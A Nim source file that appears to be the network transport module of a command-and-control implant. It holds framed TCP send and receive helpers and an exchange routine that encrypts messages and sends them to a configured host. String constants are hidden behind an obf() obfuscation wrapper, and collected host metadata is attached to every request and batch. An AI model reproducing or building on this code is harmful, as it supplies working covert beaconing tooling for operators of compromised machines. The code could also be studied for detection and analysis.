import std/json
import ../global
import ../general/strings
import ../crypt/transport
import ../general/metadata
import ../linapi/handlers
import ./frame_chunk
import ./relay_packet

proc tcpClose*(fd: culong) =
  # Closes the TCP socket
  closeFd(cint(fd))

proc readFrameSocket*(fd: culong): string =
  # Reads framed pieces from the socket until the frame is complete
  result = ""
  let sock = cint(fd)
  if sock == socketInvalidFd:
    return ""
  while true:
    var hdr: array[4, char]
    var got = 0
    while got < 4:
      let n = osRecv(sock, addr hdr[got], 4 - got.csize_t, 0)
      if n <= 0:
        return ""
      got += n.int
    let hdrVal = frameHdrFromBE(hdr)
    let pieceLen = framePieceLen(hdrVal)
    let more = frameHasMore(hdrVal)
    if pieceLen <= 0:
      return ""
    var body = newString(pieceLen)
    got = 0
    while got < pieceLen:
      let n = osRecv(sock, addr body[got], (pieceLen - got).csize_t, 0)
      if n <= 0:
        return ""
      got += n.int
    result.add body
    if not more:
      break

proc writeFrameSocket*(fd: culong, payload: string) =
  # Writes the payload to the socket as framed pieces
  if payload.len <= 0:
    return
  let sock = cint(fd)
  if sock == socketInvalidFd:
    return
  var off = 0
  while off < payload.len:
    let pieceLen = min(frameChunkSize, payload.len - off)
    let more = off + pieceLen < payload.len
    let hdr = frameHdrToBE(frameHdrEncode(pieceLen, more))
    var sent = 0
    while sent < 4:
      let n = osSend(sock, addr hdr[sent], (4 - sent).csize_t, 0)
      if n <= 0:
        return
      sent += n.int
    sent = 0
    while sent < pieceLen:
      let n = osSend(sock, addr payload[off + sent], (pieceLen - sent).csize_t, 0)
      if n <= 0:
        return
      sent += n.int
    off += pieceLen

proc tcpConnect*(host: string, port: int): culong =
  # Connects a TCP socket to the host and port
  var hints = AddrInfo(
    aiFamily: afInet,
    aiSocktype: sockStream,
    aiProtocol: ipprotoTcp
  )
  var res: ptr AddrInfo = nil
  let sport = $port
  if getaddrinfo(host.cstring, sport.cstring, addr hints, res) != 0:
    return 0
  defer:
    if res != nil:
      freeAddrInfo(res)
  let s = osSocket(
    res.aiFamily,
    res.aiSocktype,
    res.aiProtocol
  )
  if s == socketInvalidFd:
    return 0
  if osConnect(s, res.aiAddr, res.aiAddrlen) != 0:
    closeFd(s)
    return 0
  culong(s)

proc tcpListen*(port: int): culong =
  # Binds a TCP socket and starts listening on the port
  let s = osSocket(afInet, sockStream, ipprotoTcp)
  if s == socketInvalidFd:
    return 0
  var yes: cint = 1
  discard osSetsockopt(s, solSocket, soReuseaddr, addr yes, cuint(sizeof(yes)))
  var addrIn: Sockaddr_in
  zeroMem(addr addrIn, sizeof(addrIn))
  addrIn.sin_family = TSa_Family(afInet)
  addrIn.sin_port = osHtons(port.uint16)
  if osBind(s, addr addrIn, cuint(sizeof(addrIn))) != 0:
    closeFd(s)
    return 0
  if osListen(s, 128) != 0:
    closeFd(s)
    return 0
  culong(s)

proc tcpAccept*(listenFd: culong): culong =
  # Accepts one client socket from the listening socket
  let client = osAccept(cint(listenFd), nil, nil)
  if client == socketInvalidFd:
    return 0
  culong(client)

proc tcpSetRecvTimeout*(fd: culong) =
  # Sets the receive timeout on the TCP socket
  setSockRecvTimeout(cint(fd), relayTimeout)

proc tcpExchange*(payload: var string): TransportResponse =
  # Connects, sends the encrypted payload, and returns the parsed response
  let p = parsePortDigits(port)
  if p == 0:
    return transportFail(obf("invalid_port portStr=") & port)
  if payload.len == 0:
    return transportFail(obf("empty_payload"))
  var fd = tcpConnect(host, p)
  if fd == 0:
    return transportFail(obf("tcp_connect_failed host=") & host & obf(" port=") & $p)
  try:
    let sentLen = payload.len
    var enc = cryptEncrypt(payload)
    payload.setLen(0)
    writeFrameSocket(fd, enc)
    enc.setLen(0)
    tcpSetRecvTimeout(fd)
    let wire = readFrameSocket(fd)
    var raw = ""
    try:
      raw = cryptDecrypt(wire)
    except CatchableError:
      discard
    if raw.len == 0:
      return transportFail(obf("tcp_read_empty host=") & host & obf(" port=") & $p &
        obf(" sentLen=") & $sentLen)
    result = parseTransportResponse(raw)
  finally:
    tcpClose(fd)

proc sendRequest*(tag: string): TransportResponse =
  # Builds an input envelope with metadata and sends it over TCP
  var content = %*{(obf("option")): obf("input"), (obf("host")): tag}
  content[obf("metadata")] = createMetadata()
  var envelope = buildEnvelope(content)
  result = tcpExchange(envelope)

proc sendBatch*(payload: string): TransportResponse =
  # Attaches metadata to the batch and sends it over TCP
  if payload.len <= 2 or payload == obf("[]"):
    return transportFail(obf("empty_batch payloadLen=") & $payload.len)
  try:
    let batch = parseJson(payload)
    if batch.kind == JArray:
      let meta = createMetadata()
      for item in batch:
        if item.kind == JObject:
          item[obf("metadata")] = meta
    var envelope = buildEnvelope(batch)
    result = tcpExchange(envelope)
  except JsonParsingError as e:
    result = transportFail(obf("batch_json_parse: ") & e.msg & obf(" payloadPreview=") & clipText(payload))
